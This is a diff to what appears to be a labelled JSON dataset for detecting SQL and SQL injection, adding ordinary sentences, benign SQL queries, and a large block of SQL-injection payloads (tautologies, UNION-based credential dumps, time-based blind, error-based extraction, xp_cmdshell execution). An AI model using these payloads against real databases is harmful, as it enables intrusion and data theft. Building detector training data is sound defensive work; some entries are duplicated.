@@ -95,57 +95,307 @@
         "label": 1
     },
     {
-        "content": "The concert will start at 8 PM on August 10, 2024.",
+        "content": "INSERT INTO employees (first_name, last_name, salary) VALUES ('John', 'Doe', 50000);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "UPDATE products SET price = price * 1.1 WHERE category = 'Electronics';",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "DELETE FROM orders WHERE order_date < '2023-01-01';",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE TABLE customers (id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100));",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "ALTER TABLE employees ADD COLUMN department VARCHAR(50);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "DROP TABLE old_records;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "TRUNCATE TABLE temp_data;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE INDEX idx_last_name ON employees (last_name);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "GRANT SELECT, INSERT ON products TO user_role;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "REVOKE DELETE ON customers FROM temp_user;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "BEGIN TRANSACTION;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "COMMIT;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "ROLLBACK;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE VIEW high_value_orders AS SELECT * FROM orders WHERE total_amount > 1000;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "MERGE INTO target_table USING source_table ON (target_table.id = source_table.id);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE PROCEDURE get_employee_info (@emp_id INT) AS BEGIN SELECT * FROM employees WHERE employee_id = @emp_id; END;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "EXEC get_employee_info @emp_id = 100;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE TRIGGER update_inventory AFTER INSERT ON orders FOR EACH ROW BEGIN UPDATE inventory SET quantity = quantity - NEW.quantity WHERE product_id = NEW.product_id; END;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "DECLARE @counter INT = 0;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "WHILE @counter < 10 BEGIN SET @counter = @counter + 1; END;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "IF EXISTS (SELECT 1 FROM employees WHERE department = 'IT') BEGIN SELECT 'IT department exists'; END;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CASE WHEN salary > 50000 THEN 'High' WHEN salary > 30000 THEN 'Medium' ELSE 'Low' END AS salary_category;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH cte_sales AS (SELECT product_id, SUM(quantity) AS total_sold FROM order_details GROUP BY product_id) SELECT * FROM cte_sales;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT product_name, price, ROW_NUMBER() OVER (ORDER BY price DESC) AS price_rank FROM products;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT category, AVG(price) AS avg_price FROM products GROUP BY category HAVING AVG(price) > 100;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-12-31';",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT * FROM employees WHERE department IN ('Sales', 'Marketing', 'IT');",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT * FROM products WHERE product_name LIKE '%Phone%';",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT COALESCE(phone, email, 'N/A') AS contact FROM customers;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT NULLIF(column1, column2) AS result FROM my_table;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT CAST(price AS DECIMAL(10,2)) AS formatted_price FROM products;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT CONVERT(VARCHAR(10), order_date, 120) AS formatted_date FROM orders;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT employee_id, first_name, last_name, RANK() OVER (ORDER BY salary DESC) AS salary_rank FROM employees;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT product_name, price, DENSE_RANK() OVER (PARTITION BY category ORDER BY price DESC) AS price_rank_in_category FROM products;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT customer_name, order_date, order_total, LAG(order_total) OVER (PARTITION BY customer_name ORDER BY order_date) AS previous_order_total FROM orders;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT product_name, units_in_stock, LEAD(units_in_stock) OVER (ORDER BY product_id) AS next_product_stock FROM products;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT department, AVG(salary) AS avg_salary, GROUPING(department) AS is_total FROM employees GROUP BY ROLLUP (department);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT category, product_name, SUM(sales_amount) FROM sales GROUP BY CUBE (category, product_name);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT DISTINCT ON (department) employee_id, first_name, last_name, salary FROM employees ORDER BY department, salary DESC;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE MATERIALIZED VIEW monthly_sales AS SELECT DATE_TRUNC('month', order_date) AS month, SUM(total_amount) AS total_sales FROM orders GROUP BY DATE_TRUNC('month', order_date);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "EXPLAIN SELECT * FROM orders WHERE customer_id = 100;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE SEQUENCE order_id_seq START 1000;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT NEXTVAL('order_id_seq');",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE FUNCTION get_total_sales(start_date DATE, end_date DATE) RETURNS DECIMAL(10,2)",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT * FROM products CROSS JOIN categories;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT * FROM orders FULL OUTER JOIN customers ON orders.customer_id = customers.customer_id;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT employee_id, first_name, last_name FROM employees UNION SELECT customer_id, first_name, last_name FROM customers;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT product_name, price FROM products WHERE price > ALL (SELECT AVG(price) FROM products GROUP BY category);",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "CREATE UNIQUE INDEX idx_email ON customers (LOWER(email));",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT JSON_OBJECT('name', first_name || ' ' || last_name, 'email', email) AS customer_info FROM customers;",
+        "type": "general sql queries",
+        "label": 1
+    },
+    {
+        "content": "The concert will start at 8 PM on August 10, 2024",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The population of the city is approximately 1.5 million.",
+        "content": "The population of the city is approximately 1.5 million",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "On December 31, 2023, the world will celebrate New Year's Eve.",
+        "content": "On December 31, 2023, the world will celebrate New Year's Eve",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The average temperature in July is around 30 degrees Celsius.",
+        "content": "The average temperature in July is around 30 degrees Celsius",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The marathon will take place on November 5, 2024, in New York.",
+        "content": "The marathon will take place on November 5, 2024, in New York",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "My brother is 10 years old and loves playing soccer.",
+        "content": "My brother is 10 years old and loves playing soccer",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The movie 'Inception' was released in 2010 and is a masterpiece.",
+        "content": "The movie 'Inception' was released in 2010 and is a masterpiece",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The last train leaves at 11:45 PM every night.",
+        "content": "The last train leaves at 11:45 PM every night",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "The project starts on 2023-09-01 and ends on 2024-06-30.",
+        "content": "The project starts on 2023-09-01 and ends on 2024-06-30",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "My favorite color is blue, and I have a cat named Whiskers.",
+        "content": "My favorite color is blue, and I have a cat named Whiskers",
         "type": "general sentences",
         "label": 0
     },
     {
-        "content": "Alice was born on March 15, 1995, and loves to travel.",
+        "content": "Alice was born on March 15, 1995, and loves to travel",
         "type": "general sentences",
         "label": 0
     },
@@ -166,6 +416,156 @@
     },
     {
         "content": "Yesterday was July 25, 2023, and it was sunny all day.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The SELECT committee chose the best candidates for the job.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We need to UPDATE our policies to reflect the current situation.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "It's important to INSERT new ideas into the conversation.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Let's DELETE that negative thought from our minds.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We should JOIN forces to tackle this problem together.",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The company aims to UNION all departments for better collaboration",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Can you COMMIT to finishing the project by next week",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We need to ROLLBACK our decision; it wasn't the right choice",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The team will MERGE their findings in the final report",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Let's CREATE a plan to improve our productivity",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "It's crucial to BACKUP your data regularly",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We should TRUNCATE our expenses to stay within budget",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The manager decided to ALTER the meeting schedule",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We need to GRANT more autonomy to our employees",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "It's time to REVOKE outdated permissions in our system",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The company will PARTITION the workload among different teams",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We should NORMALIZE our processes across all branches",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Let's try to OPTIMIZE our workflow for better efficiency",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The team needs to AGGREGATE all the customer feedback",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We must VALIDATE all the information before making a decision",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "It's important to TRIGGER alerts when inventory runs low",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The company plans to REPLICATE its success in other markets",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We should EXECUTE our plans without further delay",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Let's INNER JOIN our efforts to achieve our goals",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The team will OUTER JOIN with external consultants for this project",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We need to HAVING a clear understanding of our objectives",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "It's crucial to GROUP BY our priorities when allocating resources",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "The manager will ORDER BY importance when assigning tasks",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "We should LIMIT our focus to the most critical issues",
+        "type": "general sentences",
+        "label": 0
+    },
+    {
+        "content": "Let's DISTINCT ourselves from the competition with innovative ideas",
         "type": "general sentences",
         "label": 0
     },
@@ -215,7 +615,7 @@
         "label": 0
     },
     {
-        "content": "select on from this 'table', 'database'",
+        "content": "select on this 'table', 'database' that you want",
         "type": "random input",
         "label": 0
     },
@@ -485,6 +885,131 @@
         "label": 0
     },
     {
+        "content": "SELECT e.name, d.name, AVG(e.salary) OVER (PARTITION BY d.id) FROM employees e JOIN departments d ON e.dept_id = d.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH RECURSIVE cte AS (SELECT id, parent_id, name FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.id, c.parent_id, c.name FROM categories c JOIN cte ON c.parent_id = cte.id) SELECT * FROM cte;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT p.name, SUM(od.quantity * od.price) AS revenue, RANK() OVER (ORDER BY SUM(od.quantity * od.price) DESC) FROM products p JOIN order_details od ON p.id = od.product_id GROUP BY p.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT c.name, COUNT(o.id) AS order_count, NTILE(4) OVER (ORDER BY COUNT(o.id)) AS customer_segment FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, e.salary, LAG(e.salary) OVER (ORDER BY e.hire_date) AS prev_salary, LEAD(e.salary) OVER (ORDER BY e.hire_date) AS next_salary FROM employees e;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT p.name, AVG(r.rating) AS avg_rating, PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY r.rating) OVER (PARTITION BY p.id) AS median_rating FROM products p JOIN reviews r ON p.id = r.product_id GROUP BY p.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT o.id, o.total, SUM(o.total) OVER (ORDER BY o.date ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS rolling_sum FROM orders o;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, d.name, e.salary, FIRST_VALUE(e.salary) OVER (PARTITION BY d.id ORDER BY e.salary DESC) AS highest_salary FROM employees e JOIN departments d ON e.dept_id = d.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH sales_rank AS (SELECT product_id, SUM(quantity) AS total_sold, RANK() OVER (ORDER BY SUM(quantity) DESC) AS rank FROM order_details GROUP BY product_id) SELECT p.name, sr.total_sold FROM products p JOIN sales_rank sr ON p.id = sr.product_id WHERE sr.rank <= 5;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT c.name, DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS monthly_total, AVG(SUM(o.total)) OVER (PARTITION BY c.id ORDER BY DATE_TRUNC('month', o.date) ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS moving_avg FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.id, DATE_TRUNC('month', o.date);",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT p.name, c.name AS category, p.price, DENSE_RANK() OVER (PARTITION BY c.id ORDER BY p.price) AS price_rank FROM products p JOIN categories c ON p.category_id = c.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, COUNT(DISTINCT p.id) AS projects, STRING_AGG(p.name, ', ' ORDER BY p.name) AS project_list FROM employees e LEFT JOIN employee_projects ep ON e.id = ep.employee_id LEFT JOIN projects p ON ep.project_id = p.id GROUP BY e.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT o.id, o.date, LAG(o.date) OVER (PARTITION BY o.customer_id ORDER BY o.date) AS prev_order_date, o.date - LAG(o.date) OVER (PARTITION BY o.customer_id ORDER BY o.date) AS days_since_last_order FROM orders o;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH monthly_sales AS (SELECT DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS total_sales FROM orders o GROUP BY DATE_TRUNC('month', o.date)) SELECT month, total_sales, total_sales - LAG(total_sales) OVER (ORDER BY month) AS sales_difference FROM monthly_sales;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT d.name, AVG(e.salary) AS avg_salary, MAX(e.salary) AS max_salary, MIN(e.salary) AS min_salary, COUNT(*) AS employee_count, SUM(CASE WHEN e.salary > (SELECT AVG(salary) FROM employees) THEN 1 ELSE 0 END) AS above_avg_count FROM departments d JOIN employees e ON d.id = e.department_id GROUP BY d.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, d.name, AVG(e.salary) OVER (PARTITION BY d.id) FROM employees e JOIN departments d ON e.dept_id = d.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH RECURSIVE cte AS (SELECT id, parent_id, name FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.id, c.parent_id, c.name FROM categories c JOIN cte ON c.parent_id = cte.id) SELECT * FROM cte;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT p.name, SUM(od.quantity * od.price) AS revenue, RANK() OVER (ORDER BY SUM(od.quantity * od.price) DESC) FROM products p JOIN order_details od ON p.id = od.product_id GROUP BY p.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT c.name, COUNT(o.id) AS order_count, NTILE(4) OVER (ORDER BY COUNT(o.id)) AS customer_segment FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, e.salary, LAG(e.salary) OVER (ORDER BY e.hire_date) AS prev_salary, LEAD(e.salary) OVER (ORDER BY e.hire_date) AS next_salary FROM employees e;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT p.name, AVG(r.rating) AS avg_rating, PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY r.rating) OVER (PARTITION BY p.id) AS median_rating FROM products p JOIN reviews r ON p.id = r.product_id GROUP BY p.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT o.id, o.total, SUM(o.total) OVER (ORDER BY o.date ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS rolling_sum FROM orders o;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT e.name, d.name, e.salary, FIRST_VALUE(e.salary) OVER (PARTITION BY d.id ORDER BY e.salary DESC) AS highest_salary FROM employees e JOIN departments d ON e.dept_id = d.id;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "WITH sales_rank AS (SELECT product_id, SUM(quantity) AS total_sold, RANK() OVER (ORDER BY SUM(quantity) DESC) AS rank FROM order_details GROUP BY product_id) SELECT p.name, sr.total_sold FROM products p JOIN sales_rank sr ON p.id = sr.product_id WHERE sr.rank <= 5;",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "SELECT c.name, DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS monthly_total, AVG(SUM(o.total)) OVER (PARTITION BY c.id ORDER BY DATE_TRUNC('month', o.date) ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS moving_avg FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.id, DATE_TRUNC('month', o.date);",
+        "type": "complex sql queries",
+        "label": 1
+    },
+    {
         "content": "SELECT product_name, price FROM inventory WHERE stock > 50 AND category = 'Electronics'",
         "type": "complex sql queries",
         "label": 1
@@ -637,6 +1162,511 @@
     {
         "content": "SELECT AVG(salary) FROM employees WHERE department_id = 2 AND employment_status = 'Full-time'",
         "type": "complex sql queries",
+        "label": 1
+    },
+    {
+        "content": "' OR '1'='1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "\" OR \"1\"=\"1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 OR 1=1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "' OR 'x'='x",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "\" OR \"x\"=\"x",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' ORDER BY 1--+",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' ORDER BY 2--+",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' ORDER BY 3--+",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' UNION SELECT NULL--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' UNION SELECT NULL,NULL--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' UNION SELECT NULL,NULL,NULL--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT username, password FROM users--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "' OR 1=1 LIMIT 1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=0",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND '1'='1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=(SELECT COUNT(*) FROM tablenames)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=(SELECT COUNT(*) FROM tablenames)--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "'; WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1); WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1)); WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1'; WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1'); WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1')); WAITFOR DELAY '0:0:10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND SLEEP(5)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND SLEEP(5)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1) AND SLEEP(5)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1)) AND SLEEP(5)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1')) AND SLEEP(5)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "'; EXEC xp_cmdshell('ping 10.10.10.10')--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "'; exec master..xp_cmdshell 'ping 10.10.10.10'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "UNION SELECT @@version--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "UNION SELECT @@servername, @@language--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 2>1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1>2",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND 'one'='one",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND 'one'='one'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND 'one'='one'#",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT user()",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT system_user()",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT user FROM mysql.user",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT version()",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT database()",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT table_name FROM information_schema.tables",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=CONVERT(int,(SELECT @@version))",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND 1=CAST((SELECT user) as signed)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND SUBSTR(@@version,1,1) = '5'",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND MID(VERSION(),1,1) = '5';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND MID(VERSION(),1,1) > '4';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND LEFT(VERSION(),1) = '5';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND LEFT(VERSION(),1) > '4';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND SUBSTR(VERSION(),1,1) = '5';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND SUBSTRING(VERSION(),1,1) = '5';",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 PROCEDURE ANALYSE()",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' HAVING 1=1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' GROUP BY columnnames HAVING 1=1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--",
+        "type": "sql injections",
+        "label": 1
